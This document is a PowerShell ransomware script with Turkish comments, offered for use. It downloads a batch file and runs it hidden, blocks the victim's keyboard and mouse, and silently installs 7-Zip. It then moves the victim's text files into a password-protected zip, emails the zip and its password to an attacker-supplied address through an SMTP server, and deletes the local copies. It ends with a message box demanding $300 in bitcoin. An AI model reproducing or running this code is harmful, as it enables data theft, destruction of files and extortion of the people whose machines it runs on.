#Yetki sorunu çekmemek için yetki alıyor
﻿cd $env:LOCALAPPDATA
Invoke-WebRequest -URI bats direct link -OutFile batname.bat
cd $env:LOCALAPPDATA
powershell.exe -WindowStyle Hidden -file "$env:LOCALAPPDATA\batname.bat"



#Bilgisayarın mouse ve klavyesini devre dışı bırakır
$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
$userInput::BlockInput($true)

#Dosyalari kuruyor
$workdir = "$env:LOCALAPPDATA"

If (Test-Path -Path $workdir -PathType Container)
{ Write-Host "$workdir already exists" -ForegroundColor Red}
ELSE
{ New-Item -Path $workdir  -ItemType directory }

#installerı indiriyor
$source = "http://www.7-zip.org/a/7z1604-x64.msi"
$destination = "$workdir\7-Zip.msi"


if (Get-Command 'Invoke-Webrequest')
{
     Invoke-WebRequest $source -OutFile $destination
}
else
{
    $WebClient = New-Object System.Net.WebClient
    $webclient.DownloadFile($source, $destination)
}

Invoke-WebRequest $source -OutFile $destination 

#kurulumu başlatiyor
msiexec.exe /i "$workdir\7-Zip.msi" /qb

#10 saniye bekle
Start-Sleep -s 10

#installerı kaldırıyor
rm -Force $workdir\7*

#çalinabilecek dosyaları hazırlıyor
$Source = "$env:LOCALAPPDATA\StealableFiles"
$Destination = "$env:LOCALAPPDATA\StolenFiles"

#dosyaları kopyaladiktan sonra siliyor
$cp = robocopy /mov $Source $Destination *.txt /s

#8 hanelik rastgele sifreler olusturuyor
[Reflection.Assembly]::LoadWithPartialName("System.Web")
$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)

#7zip için kaynak oluşturuyor,eger kod calismazsa path'i (C:\Program Files\7-Zip\7z.exe) olarak degistirin suanlik AppData/Local'e kuruyor,
$pathTo64Bit7Zip = "$env:LOCALAPPDATA"

#sifrelenmis zip olusturuyor 
$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
$windowStyle = "Normal"
$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

#hedef klasoru siliyor
$del = Remove-Item $Destination -Force -Recurse

$email = "(calinan dosyalarin gönderelecegi email girin)"

#emailinize sifrelenmis zipleri sifresiyle beraber yolluyor
$SMTPServer = "smtp.example.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Password $(get-date -f yyyy-MM-dd)"
$Body =  $randomPassword
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Mailer.send($Msg)
$Msg.Dispose()
$Mailer.Dispose()

#zip dosyasini emailinize yolluyor
$ZipFolder = "$env:LOCALAPPDATA\StolenFiles.zip"
$SMTPServer = "smtp.example.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Content $(get-date -f yyyy-MM-dd)"
$Body = "Zip Attached"
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Attachment = new-object Net.Mail.Attachment($ZipFolder)
$Msg.attachments.add($Attachment)
$Mailer.send($Msg)
$Attachment.Dispose()
$Msg.Dispose()
$Mailer.Dispose()

#zip dosyalarini siliyor
$del = Remove-Item $ZipFolder -Force -Recurse

#klavye mouse devredışı
$userInput::BlockInput($false)

#parayi istediginizi gosteren mesaj
#mesaj icin .NET Assemblysi olmasi gerekiyor
Add-Type -AssemblyName System.Windows.Forms

#mesaji goster
$result = [System.Windows.Forms.MessageBox]::Show('We have stolen your important files and encrypted them but solution in your hands to solve this send worth 300$ bitcoin to this wallet.', '!-Notice-!', 'Ok', 'Warning')


